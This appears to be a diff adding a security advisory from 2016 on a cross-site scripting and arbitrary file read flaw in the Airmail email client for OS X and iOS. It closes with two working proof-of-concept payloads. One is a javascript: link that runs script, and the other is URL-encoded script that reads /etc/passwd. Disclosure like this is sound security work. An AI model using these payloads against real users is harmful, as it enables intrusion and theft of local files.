@@ -1,0 +1,36 @@
+Airmail is a popular email client on iOS and OS X.
+I found a vulnerability in airmail of the latest version which could cause
+a file:// xss and arbitrary file read.
+
+Author: redrain, yu.hong@chaitin.com
+Date: 2016-08-15
+Version: 3.0.2 and earlier
+Platform: OS X and iOS
+Site: http://airmailapp.com/
+Vendor: http://airmailapp.com/
+Vendor Notified: 2016-08-15
+
+Vulnerability:
+There is a file:// xss in airmail version 3.0.2 and earlier.
+The app can deal the URLscheme render with link detection, any user can
+edit the email content in reply with the evil code with the TL;DR.
+
+Airmail implements its user interface using an embedded version of WebKit,
+furthermore Airmail on OS X will render any URI as a clickable HTML <a
+href= link. An attacker can create a simple JavaScript URI (e.g.,
+javascript:) which when clicked grants the attacker initial JavaScript
+execution (XSS) in the context of the application DOM.
+
+
+PoC:
+javascript://www.baidu.com/research?%0Aprompt(1)
+
+a
+
+Arbitrary file read:
+
+javascript://www.baidu.com/research?%0Afunction%20reqListener%20()%20%7B%0A%
+20%20prompt(this.responseText)%3B%0A%7D%0Avar%20oReq%20%3D%
+20new%20XMLHttpRequest()%3B%0AoReq.addEventListener(%
+22load%22%2C%20reqListener)%3B%0AoReq.open(%22GET%22%2C%
+20%22file%3A%2F%2F%2Fetc%2Fpasswd%22)%3B%0AoReq.send()%3B
